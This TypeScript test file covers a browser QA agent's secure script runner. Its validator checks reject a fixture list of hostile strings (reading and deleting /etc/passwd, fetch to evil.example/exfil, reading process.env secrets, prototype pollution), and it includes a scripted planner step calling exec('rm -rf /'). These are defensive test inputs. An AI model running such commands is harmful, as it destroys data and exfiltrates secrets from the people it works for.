/* v32 — Secure script runner (Phase 10). Two parts:
 *
 *  1. Pure validator checks (no browser/router): validateScriptSteps() accepts
 *     the allowlisted step shapes and rejects import/require/fs/network/eval/
 *     Function/prototype-access patterns, unknown step types, unknown/extra
 *     fields (.strict()), and an oversized step list — all WITHOUT executing
 *     anything (rejection happens before any BrowserPort call).
 *  2. A `script` action driven through the real runDriverLoop with a hand-
 *     rolled FAKE BrowserPort + scripted FAKE planner (same harness shape as
 *     v13.tier4.ts), proving: an allowlisted script executes its steps in
 *     order against BrowserPort only; a {{secret:NAME}} placeholder resolves
 *     at execute time without leaking into the report/audit; a rejected
 *     script never touches the browser and the step just fails (no crash).
 *
 * Run: npx tsx test/v32.script-runner.ts
 */

import fs from 'node:fs';
import os from 'node:os';
import path from 'node:path';
import { Vault } from '../src/vault/vault.js';
import { runDriverLoop } from '../src/driver/loop.js';
import { ArtifactStore } from '../src/report/artifacts.js';
import { ModelRouter } from '../src/router/model-router.js';
import type { Capability, JsonRequest, ModelAdapter } from '../src/router/adapter.js';
import { validateScriptSteps } from '../src/driver/script-runner/index.js';
import type {
  AxNode,
  AxSnapshot,
  BrowserPort,
  ConsoleEntry,
  LogpointSpec,
  NetworkEntry,
} from '../src/ports/browser-port.js';

const checks: [string, boolean][] = [];
const check = (label: string, ok: boolean) => {
  checks.push([label, ok]);
  console.log(`${ok ? 'PASS' : 'FAIL'}  ${label}`);
};

/* ===================== 1) validator: accept/reject ===================== */
console.log('=== v32 1/2: validateScriptSteps ===');
{
  const allowlisted = validateScriptSteps([
    { type: 'navigate', url: 'http://localhost:3000/login' },
    { type: 'type', nodeId: 'n1', text: 'user@example.com' },
    { type: 'click', nodeId: 'n2' },
    { type: 'wait', ms: 100 },
    { type: 'assert_dom', nodeId: 'n3', contains: 'Welcome' },
  ]);
  check('accepts a normal allowlisted step sequence', allowlisted.ok && allowlisted.steps.length === 5);

  check('rejects an unknown step type', !validateScriptSteps([{ type: 'eval', code: '1+1' }]).ok);
  check('rejects an extra/unknown field on a known step (.strict())', !validateScriptSteps([{ type: 'click', nodeId: 'n1', extra: 'nope' }]).ok);
  check('rejects an empty step list', !validateScriptSteps([]).ok);
  check('rejects a non-array body', !validateScriptSteps({ type: 'click', nodeId: 'n1' }).ok);
  check(
    'rejects over the step-count cap',
    !validateScriptSteps(Array.from({ length: 25 }, () => ({ type: 'wait', ms: 50 }))).ok,
  );

  const dangerous: Array<{ label: string; step: unknown }> = [
    { label: 'require(', step: { type: 'type', nodeId: 'n1', text: 'require("fs").readFileSync("/etc/passwd")' } },
    { label: 'import(', step: { type: 'navigate', url: 'javascript:import("node:fs")' } },
    { label: 'process.', step: { type: 'type', nodeId: 'n1', text: 'process.env.SECRET' } },
    { label: 'eval(', step: { type: 'type', nodeId: 'n1', text: 'eval("1+1")' } },
    { label: 'new Function', step: { type: 'type', nodeId: 'n1', text: 'new Function("return 1")()' } },
    { label: 'fs.', step: { type: 'type', nodeId: 'n1', text: 'fs.unlinkSync("/etc/passwd")' } },
    { label: 'fetch(', step: { type: 'type', nodeId: 'n1', text: 'fetch("https://evil.example/exfil")' } },
    { label: 'XMLHttpRequest', step: { type: 'type', nodeId: 'n1', text: 'new XMLHttpRequest()' } },
    { label: 'WebSocket(', step: { type: 'type', nodeId: 'n1', text: 'new WebSocket("wss://evil.example")' } },
    { label: '__proto__', step: { type: 'type', nodeId: 'n1', text: 'x.__proto__.polluted = true' } },
    { label: 'template-literal injection', step: { type: 'type', nodeId: 'n1', text: '`${process.exit()}`' } },
  ];
  for (const { label, step } of dangerous) {
    const result = validateScriptSteps([step]);
    check(`rejects a step containing ${label}`, !result.ok);
  }

  // a legitimate navigate to a URL that happens to contain the substring
  // "fetch" as part of a path segment must NOT be rejected — the scan targets
  // code-shaped patterns (fetch(...) as a call), not the bare word.
  const legitUrl = validateScriptSteps([{ type: 'navigate', url: 'http://localhost:3000/fetch-results' }]);
  check('does not false-positive on a URL containing a dangerous WORD (not a call)', legitUrl.ok);
}

/* ===================== fake harness (same shape as v13.tier4.ts) ===================== */

function fakeTree(): AxNode {
  return {
    id: 'root',
    role: 'WebArea',
    children: [
      { id: 'n1', role: 'textbox', name: 'Password' },
      { id: 'n2', role: 'button', name: 'Sign in' },
    ],
  };
}

function fakeSnapshot(): AxSnapshot {
  return { root: fakeTree(), text: 'textbox "Password" n1\nbutton "Sign in" n2', truncated: false };
}

/** FAKE BrowserPort implementing the FULL current contract (including the
 * Phase 9 upload/drag/blur/mouse/tab primitives BrowserPort now requires),
 * logging every call the script runner makes so tests can assert ORDER. */
class FakeBrowser implements BrowserPort {
  calls: string[] = [];
  typed: { nodeId: string; text: string }[] = [];
  constructor(public currentUrl: string) {}
  async launch(): Promise<void> {}
  async navigate(url: string): Promise<void> {
    this.calls.push(`navigate:${url}`);
    this.currentUrl = url;
  }
  async url(): Promise<string> {
    return this.currentUrl;
  }
  async axTree(): Promise<AxSnapshot> {
    return fakeSnapshot();
  }
  async click(nodeId: string): Promise<void> {
    this.calls.push(`click:${nodeId}`);
  }
  async type(nodeId: string, text: string): Promise<void> {
    this.calls.push(`type:${nodeId}`);
    this.typed.push({ nodeId, text });
  }
  async hover(nodeId: string): Promise<void> {
    this.calls.push(`hover:${nodeId}`);
  }
  async pressKey(key: string): Promise<void> {
    this.calls.push(`pressKey:${key}`);
  }
  async selectOption(nodeId: string, value: string): Promise<void> {
    this.calls.push(`selectOption:${nodeId}:${value}`);
  }
  async reload(): Promise<void> {
    this.calls.push('reload');
  }
  async goBack(): Promise<void> {
    this.calls.push('goBack');
  }
  async uploadFile(nodeId: string, paths: string[]): Promise<void> {
    this.calls.push(`uploadFile:${nodeId}:${paths.join(',')}`);
  }
  async dragAndDrop(sourceId: string, targetId: string): Promise<void> {
    this.calls.push(`dragAndDrop:${sourceId}:${targetId}`);
  }
  async blur(nodeId: string): Promise<void> {
    this.calls.push(`blur:${nodeId}`);
  }
  async mouse(kind: 'move' | 'down' | 'up', x: number, y: number): Promise<void> {
    this.calls.push(`mouse:${kind}:${x}:${y}`);
  }
  async openTab(url: string): Promise<string> {
    this.calls.push(`openTab:${url}`);
    return 'fake-tab-1';
  }
  async switchTab(idOrIndex: string | number): Promise<void> {
    this.calls.push(`switchTab:${idOrIndex}`);
  }
  async closeTab(id: string): Promise<void> {
    this.calls.push(`closeTab:${id}`);
  }
  async screenshot(): Promise<Buffer> {
    return Buffer.from('\x89PNG\r\n\x1a\n', 'binary');
  }
  async setLogpoint(_spec: LogpointSpec): Promise<void> {}
  drainConsole(): ConsoleEntry[] {
    return [];
  }
  drainNetwork(): NetworkEntry[] {
    return [];
  }
  async close(): Promise<void> {}
}

function scriptedPlanner(plans: unknown[]): ModelAdapter {
  let i = 0;
  return {
    name: 'fake-planner',
    rung: 1,
    available: async () => true,
    supports: (c: Capability) => c === 'plan-step',
    generateJson: async (_req: JsonRequest) => {
      const p = plans[Math.min(i, plans.length - 1)];
      i++;
      return p;
    },
  };
}

function tmpArtifacts(): ArtifactStore {
  return new ArtifactStore(fs.mkdtempSync(path.join(os.tmpdir(), 'qa-art-script-')));
}

/* ===================== 2) `script` action through the driver loop ===================== */
console.log('\n=== v32 2/2: script action end-to-end ===');
{
  const dir = fs.mkdtempSync(path.join(os.tmpdir(), 'qa-vault-script-'));
  const vault = new Vault({ dir });
  const REAL = 'p@ssw0rd-REAL-VALUE';
  vault.set('LOGIN_PW', REAL);

  const browser = new FakeBrowser('http://localhost:3000/login');
  const router = new ModelRouter([
    scriptedPlanner([
      {
        thought: 'run the login flow as one script step',
        actions: [
          {
            type: 'script',
            steps: [
              { type: 'type', nodeId: 'n1', text: '{{secret:LOGIN_PW}}' },
              { type: 'click', nodeId: 'n2' },
              { type: 'wait', ms: 50 },
            ],
          },
        ],
      },
      { thought: 'done', actions: [{ type: 'finish', verdict: 'fail', reason: 'stop here (no visual model)' }] },
    ]),
  ]);
  const artifacts = tmpArtifacts();

  const report = await runDriverLoop(browser, router, artifacts, 'log in via script', 'http://localhost:3000/login', {
    maxSteps: 6,
    allowedHosts: ['localhost'],
    vault,
  });

  check(
    'script step executed type→click→wait, in order, against BrowserPort only',
    // calls[0] is the loop's own initial browser.navigate(url) before any
    // planner step; the script step's own actions follow.
    browser.calls.slice(1).join(',') === 'type:n1,click:n2',
  );
  check('the {{secret:...}} placeholder resolved to the REAL value at execute time', browser.typed[0]?.text === REAL);

  const reportJson = JSON.stringify(report);
  check('report JSON contains the placeholder, not the resolved secret', reportJson.includes('{{secret:LOGIN_PW}}') && !reportJson.includes(REAL));

  const scriptStep = report.steps.find((s) => s.action.type === 'script');
  check('the recorded script action itself carries the placeholder, unresolved', Boolean(scriptStep) && JSON.stringify(scriptStep!.action).includes('{{secret:LOGIN_PW}}'));
}

/* ----- a rejected script never touches the browser ----- */
{
  const browser = new FakeBrowser('http://localhost:3000/login');
  const router = new ModelRouter([
    scriptedPlanner([
      {
        thought: 'try a malicious script',
        actions: [
          {
            type: 'script',
            steps: [{ type: 'type', nodeId: 'n1', text: 'require("child_process").exec("rm -rf /")' }],
          },
        ],
      },
      { thought: 'give up', actions: [{ type: 'finish', verdict: 'fail', reason: 'script was rejected' }] },
    ]),
  ]);
  const artifacts = tmpArtifacts();

  const report = await runDriverLoop(browser, router, artifacts, 'malicious script', 'http://localhost:3000/login', {
    maxSteps: 6,
    allowedHosts: ['localhost'],
  });

  // calls[0] is the loop's own initial browser.navigate(url) — a rejected
  // script must add NOTHING beyond that.
  check('a rejected script never calls a single BrowserPort action method', browser.calls.length === 1);
  const rejectedStep = report.steps.find((s) => s.action.type === 'script');
  check('the rejected script step is recorded as failed with a validation reason', rejectedStep?.ok === false && (rejectedStep?.error ?? '').includes('script rejected'));
}

const failed = checks.filter(([, ok]) => !ok);
console.log(`\n${checks.length - failed.length}/${checks.length} v32 script-runner checks passed`);
process.exit(failed.length ? 1 : 0);
